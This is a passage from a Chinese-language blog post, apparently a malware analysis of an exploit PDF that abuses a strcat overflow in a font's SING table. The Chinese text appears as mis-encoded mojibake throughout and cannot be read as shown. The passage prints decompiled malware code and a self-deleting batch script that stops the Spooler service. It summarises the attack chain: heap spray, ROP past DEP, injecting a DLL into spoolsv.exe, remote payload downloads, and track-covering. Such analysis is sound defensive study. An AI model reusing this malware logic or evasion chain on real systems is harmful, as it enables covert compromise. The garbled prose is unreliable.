<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">net stop <span class="string">&quot;Spooler&quot;</span></span><br><span class="line">net stop <span class="string">&quot;Spooler&quot;</span></span><br><span class="line">del <span class="string">&quot;C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\_unstop.bat&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>å®ƒæ˜¯ä¸ºäº†å…³é—­SpooleræœåŠ¡ï¼Œç„¶ååˆ é™¤è‡ªå·±ã€‚</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">sub_401FA0</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *v1; <span class="comment">// edi</span></span><br><span class="line">  HANDLE FileA; <span class="comment">// esi</span></span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+14h] [ebp-61Ch] BYREF</span></span><br><span class="line">  CHAR Buffer[<span class="number">257</span>]; <span class="comment">// [esp+18h] [ebp-618h] BYREF</span></span><br><span class="line">  __int16 v6; <span class="comment">// [esp+119h] [ebp-517h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [esp+11Bh] [ebp-515h]</span></span><br><span class="line">  CHAR Filename[<span class="number">257</span>]; <span class="comment">// [esp+120h] [ebp-510h] BYREF</span></span><br><span class="line">  __int16 v9; <span class="comment">// [esp+221h] [ebp-40Fh]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [esp+223h] [ebp-40Dh]</span></span><br><span class="line">  CHAR v11[<span class="number">1021</span>]; <span class="comment">// [esp+228h] [ebp-408h] BYREF</span></span><br><span class="line">  __int16 v12; <span class="comment">// [esp+625h] [ebp-Bh]</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [esp+627h] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(Buffer, <span class="number">0</span>, <span class="built_in">sizeof</span>(Buffer));</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">GetTempPathA</span>(<span class="number">0x104</span>u, Buffer);</span><br><span class="line">  v1 = (<span class="type">char</span> *)&amp;NumberOfBytesWritten + <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *++v1 )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">strcpy</span>(v1, <span class="string">&quot;_unstop.bat&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(Filename, <span class="number">0</span>, <span class="built_in">sizeof</span>(Filename));</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">GetModuleFileNameA</span>(<span class="number">0</span>, Filename, <span class="number">0x104</span>u);</span><br><span class="line">  FileA = <span class="built_in">CreateFileA</span>(Buffer, <span class="number">0xC0000000</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0x10000080</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( FileA != (HANDLE)<span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v11, <span class="number">0</span>, <span class="built_in">sizeof</span>(v11));</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">wsprintfA</span>(v11, <span class="string">&quot;net stop \&quot;%s\&quot;\r\nnet stop \&quot;%s\&quot;\r\ndel \&quot;%s\&quot; \r\n&quot;</span>, a1, a1, Buffer);</span><br><span class="line">    NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">WriteFile</span>(FileA, v11, <span class="built_in">strlen</span>(v11), &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(FileA);</span><br><span class="line">    <span class="built_in">ShellExecuteA</span>(<span class="number">0</span>, <span class="string">&quot;open&quot;</span>, Buffer, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">0x1388</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¹‹åå°±ä¸å†ç»†è®² å†™äº†æ²¡ä»€ä¹ˆæ„ä¹‰(æˆ‘ä¸ä¼š)ï¼Œæ€»çš„æ¥è¯´å°±æ˜¯ï¼Œ<code>svrhost.exe</code>æ–‡ä»¶ä¼šåœ¨ç³»ç»Ÿç›®å½•ä¸‹ç”Ÿæˆå…¶ä»–ç—…æ¯’æ–‡ä»¶ï¼ŒåŒæ—¶ç¯¡æ”¹ç³»ç»Ÿæ–‡ä»¶ï¼Œç„¶åä¹Ÿä¼šåˆ›å»ºä¸€ç³»åˆ—batæ‰¹å¤„ç†æ–‡ä»¶ï¼Œè¦ä¹ˆæ˜¯å…³é—­æœåŠ¡ï¼Œè¦ä¹ˆæ˜¯åˆ é™¤è‡ªèº«ä»¥åŠç—…æ¯’ç—•è¿¹ï¼Œæˆ–è€…è¯´æ˜¯åŠ è½½æ¶æ„DLLï¼Œè€Œè¯¥æ³¨å…¥çš„æ¶æ„DLLæ–‡ä»¶å°±æ˜¯msxml0r.dllæ–‡ä»¶.<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/1ad5ad6eddc451daea701121f3fd5266d1163271.jpg"
                     
                ></p>
<p>ç»è¿‡PECompactåŠ å£³å¤„ç†ï¼Œä»–ä¼šå¾—åˆ°3ä¸ªURLåœ°å€ç„¶åä¸æ–­å‘é€HTTPè¯·æ±‚ï¼Œä¸‹è½½3ä¸ªgifæ–‡ä»¶ï¼Œå¯ä»¥çŒœæµ‹è¿™ä¸‰ä¸ªgifæ–‡ä»¶ä¸­åŒ…å«ä¸€äº›PEæ•°æ®ï¼Œç”¨æ¥æ‰§è¡Œæ¶æ„æ“ä½œã€‚æœ€å<code>shellcode</code>å°†ä¼šæŠŠPDFæ ·æœ¬ä¿®æ”¹ä¸ºæ­£å¸¸æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯åˆ é™¤äº†TTFå­—ä½“çš„<code>SING</code>è¡¨ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°PDFæ­£å¸¸æ‰“å¼€<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/9825bc315c6034a8716aa54b8e1349540823766b.jpg"
                     
                ></p>
<p>æ•´ä¸ªæ¶æ„PDFæ–‡ä»¶æµç¨‹ä¸ºï¼š<code>æ¼æ´åˆ©ç”¨PDFå†…å®¹</code>â†’<code>æ¶æ„PEæ–‡ä»¶</code>â†’<code>æ­£å¸¸PDFå†…å®¹</code></p>
<h2 id="8-æ•´ä½“è¿‡ç¨‹"><a href="#8-æ•´ä½“è¿‡ç¨‹" class="headerlink" title="8.æ•´ä½“è¿‡ç¨‹"></a>8.æ•´ä½“è¿‡ç¨‹</h2><p>èŠ±äº†å¥½ä¹…æŠŠæ¼æ´åˆ©ç”¨è¿™éƒ¨åˆ†ææ˜ç™½äº†ï¼Œæ€»ä½“æµç¨‹å½’ç»“äºå¦‚ä¸‹å‡ ç‚¹ï¼š</p>
<ol>
<li><code>strcat</code>å‡½æ•°å¯ä»¥é€šè¿‡<code>SING</code>è¡¨çš„<code>uniqueName</code>å­—æ®µæ¥è¿›è¡Œæ ˆæº¢å‡º</li>
<li>é€šè¿‡è¦†ç›–æ ˆä¸Šçš„å‡½æ•°æŒ‡é’ˆè€Œä¸æ˜¯è¿”å›å€¼ï¼Œä½¿å¾—åç»­è°ƒç”¨è¯¥æŒ‡é’ˆæ¥ç»•è¿‡<code>GS</code>ï¼Œä¹Ÿå°±æ˜¯<code>canary</code>ï¼Œç„¶åè¿›è¡Œ<code>ROP</code></li>
<li>ä½¿ç”¨<code>heap spray</code>æ¥å¸ƒç½®å¤§é‡ç›¸åŒçš„<code>shellcode</code>ã€‚å †å–·çš„è„šæœ¬ä½¿ç”¨éšæœºå˜é‡åã€\x25æ›¿ä»£%å·æ¥ã€æ·»åŠ æ— ç”¨ä»£ç æ¥ç»•è¿‡æ€æ¯’è½¯ä»¶åˆ†æ</li>
<li>é€šè¿‡<code>ROP</code>æ¥ç»•è¿‡<code>DEP</code>ä¿æŠ¤ï¼Œä¹Ÿå°±æ˜¯<code>NX</code></li>
<li>å…¶ä¸­<code>ROP</code>çš„æ„é€ æˆ‘ä»¬åˆ©ç”¨æœªå¼€å¯<code>ALSR</code>çš„æ¨¡å—æ¥è·å–<code>gadget</code>ï¼Œä»–çš„åœ°å€ä¸€èˆ¬æ˜¯å›ºå®šçš„</li>
<li>ç”±äº<code>uniqueName</code>å¯èƒ½ä¸èƒ½å¤ªå¤§ï¼Œé˜²æ­¢è¦†ç›–ç¨‹åºå…³é”®æ•°æ®ï¼Œå› æ­¤ä½¿ç”¨ä¸¤æ¬¡æ ˆè¿ç§»æ¥åˆ°ç²¾å‡†å †å–·çš„åœ°å€ï¼Œ0x0c0c0c0cï¼Œå°†æ¼æ´åˆ©ç”¨ç¨‹åºä½¿ç”¨æ–‡ä»¶æ˜ å°„çš„ä¸€äº›å‡½æ•°æ˜ å°„åˆ°å†…å­˜ï¼Œç„¶åå°†EIPæŒ‡å‘ä»–ã€‚</li>
<li>é€šè¿‡PEBç¯å¢ƒæ§åˆ¶å—æ¥è·å–<code>kernel32.dll</code>çš„åŸºåœ°å€ï¼Œä»è€Œè·å–ä¸€äº›éœ€è¦è¿è¡Œçš„å‡½æ•°åœ°å€</li>
<li>é€šè¿‡å¼‚æˆ–å’Œäº¤æ¢å­—ç¬¦æ¥å¯¹æ¶æ„PEæ–‡ä»¶è¿›è¡ŒåŠ å¯†</li>
<li>é‡Šæ”¾å¹¶ä¸”è¿è¡Œ<code>svchost.exe</code>æ¶æ„æ–‡ä»¶ï¼Œæ–‡ä»¶ååŒç³»ç»Ÿè¿›ç¨‹åä¸€è‡´ï¼Œå¢åŠ éšè”½æ€§</li>
<li>æå‡æƒé™ï¼Œå…³é—­ç³»ç»Ÿæ–‡ä»¶ä¿æŠ¤ï¼Œç”¨æ¥ä¿®æ”¹ç³»ç»Ÿæ–‡ä»¶</li>
<li>ä¿®æ”¹æ‰“å°æœåŠ¡ç¨‹åº<code>spoolsv.exe</code>çš„å¯¼å…¥è¡¨ï¼Œä½¿å¾—å…¶åœ¨å¯åŠ¨çš„æ—¶å€™åŠ è½½æ¶æ„dllç¨‹åº</li>
<li>ä¿®æ”¹æ–‡ä»¶æ—¶é—´ç­‰åŠ å¯†éšè”½æ€§ï¼Œç„¶åè¿è¡Œå®Œç¨‹åºåï¼Œä¼šåˆ é™¤æ²¡ç”¨çš„ç¨‹åºé˜²æ­¢è¢«å‘ç°</li>
<li>åˆ©ç”¨åŠ å£³é˜²æ­¢é€†å‘åˆ†æ</li>
<li>è¿œç¨‹ä¸‹è½½æ¶æ„ç¨‹åºï¼Œæœ€åä¿®æ”¹æ¶æ„æ ·æœ¬PDFæ–‡ä»¶ä¸ºæ­£å¸¸PDFå¹¶æ‰“å¼€ï¼Œå‡è£…æ˜¯æ­£å¸¸å¼€å¯ã€‚</li>
</ol>
<h2 id="9-æ¼æ´ä¿®å¤"><a href="#9-æ¼æ´ä¿®å¤" class="headerlink" title="9.æ¼æ´ä¿®å¤"></a>9.æ¼æ´ä¿®å¤</h2><p>ğŸ‰å®˜æ–¹åœ¨ä¹‹åä¿®è¡¥è¯¥æ¼æ´çš„æ—¶å€™ï¼Œæ·»åŠ äº†å­—ç¬¦ä¸²é•¿åº¦çš„æ£€æµ‹å’Œé™åˆ¶ï¼Œç”¨æ–°çš„å‡½æ•°æ¥æ›¿ä»£äº†<code>strcat</code>å‡½æ•°ï¼Œè¿™æ ·å°±é¿å…äº†åœ¨æ ˆä¸Šæ„é€ è™šå‡å‡½æ•°æŒ‡é’ˆğŸ‰</p>
<h2 id="10-æ€»ç»“"><a href="#10-æ€»ç»“" class="headerlink" title="10.æ€»ç»“"></a>10.æ€»ç»“</h2><p>ä¸€ä¸ªpdfæ–‡ä»¶å°±åƒä¸€ä¸ªexeæ–‡ä»¶ä¸€æ ·ï¼Œéƒ½æ˜¯æœ€ç»ˆè¾“å‡ºæ ¼å¼å´æ€»æœ‰äººè®¤ä¸ºå®ƒä»¬å’Œwordæ˜¯ä¸€ç±»ç¼–è¾‘æ–‡æ¡£</p>
<p>(äº‹å®ä¸Šwordè¿™ç±»ç¼–è¾‘æ–‡æ¡£ä¹Ÿå¯ä»¥æ³¨å…¥ç—…æ¯’ï¼Œä¸è¿‡æ›´å¤šçš„æ˜¯ç”¨æ¥æ¿€æ´»ğŸ™‚ï¼Œä¾‹å¦‚ä½¿ç”¨LLDBåŠ¨æ€è°ƒè¯•å¯ä»¥æ¿€æ´»office365å¥—ä»¶)ã€‚</p>
]]></content>
  </entry>
</search>
